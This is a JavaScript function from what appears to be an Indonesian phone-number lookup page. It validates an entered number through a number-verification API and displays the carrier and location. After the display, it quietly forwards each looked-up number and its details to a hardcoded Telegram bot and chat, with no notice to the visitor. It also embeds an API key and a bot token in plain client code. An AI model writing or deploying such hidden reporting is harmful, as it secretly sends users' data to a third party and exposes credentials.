function cekNomor() {
  const nomor = document.getElementById("phone").value;
  const resultBox = document.getElementById("hasil-nomor");

  if (!nomor.startsWith("+")) {
    resultBox.innerHTML = "Gunakan format internasional, contoh: +628123456789";
    return;
  }

  fetch(`https://api.apilayer.com/number_verification/validate?number=${nomor}`, {
    headers: {
      "apikey": "axl1F57lkrG7iorwlHBQuocWAjHhTl7O"
    }
  })
  .then(res => res.json())
  .then(data => {
    const info = `
      <strong>Nomor:</strong> ${data.international_format || "-"}<br>
      <strong>Negara:</strong> ${data.country_name || "-"}<br>
      <strong>Lokasi:</strong> ${data.location || "-"}<br>
      <strong>Operator:</strong> ${data.carrier || "-"}
    `;
    resultBox.innerHTML = info;

    // Kirim ke bot Telegram
    const message = `Nomor dilacak:\n${data.international_format}\nOperator: ${data.carrier}\nLokasi: ${data.location}\nNegara: ${data.country_name}`;
    fetch("https://api.telegram.org/bot7340359614:AAFXHvoBGPrp_q7ZWXRZP3qaybhvq9gntTw/sendMessage", {
      method: "POST",
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `chat_id=6466187930&text=${encodeURIComponent(message)}`
    });
  })
  .catch(() => {
    resultBox.innerHTML = "Gagal menghubungi server atau API limit.";
  });
  }
